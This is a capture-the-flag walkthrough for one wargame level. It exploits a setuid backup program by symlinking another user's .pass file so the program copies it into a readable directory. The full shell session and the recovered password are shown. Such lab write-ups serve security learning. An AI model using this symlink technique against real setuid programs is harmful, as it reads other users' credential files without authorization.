
# Walkthrough

**Main** : 
This code appears to be a simple backup program that takes a filename as a command-line argument, creates a backup of that file in a subdirectory called "./backups/", and logs the backup operation in a log file located at "./backups/.log"


**vurability:**
The binary has setuid permission set for user "level09". This means that we can exploit this binary to read the contents of the ".pass" file of user "level09".

**Solution idea:**
 Make symbolic link  of  /level09/.pass the program will open it, and backup its contents.

**Process to exploit :**
>   1. **Symbolic link **



## Step 1
### Symbolic link

```
level08@OverRide:~$ chmod 777 .
level08@OverRide:~$ echo "abc" > test
level08@OverRide:~$ cat backups/test 
abc
level08@OverRide:~$ cat backups/.log 
LOG: Starting back up: test
LOG: Finished back up test

```

```

level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
level08@OverRide:~$ ln -s /home/users/level09/.pass passwd

level08@OverRide:~$ cat backups/.log 
LOG: Starting back up: /home/users/level09/.pass
```

```

level08@OverRide:~$ ls
backups  level08  passwd  test

level08@OverRide:~$ ./level08 passwd 
level08@OverRide:~$ cat backups/.log 
LOG: Starting back up: passwd
LOG: Finished back up passwd

level08@OverRide:~$ cat backups/
.log    passwd  test    
level08@OverRide:~$ cat backups/passwd 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S

```
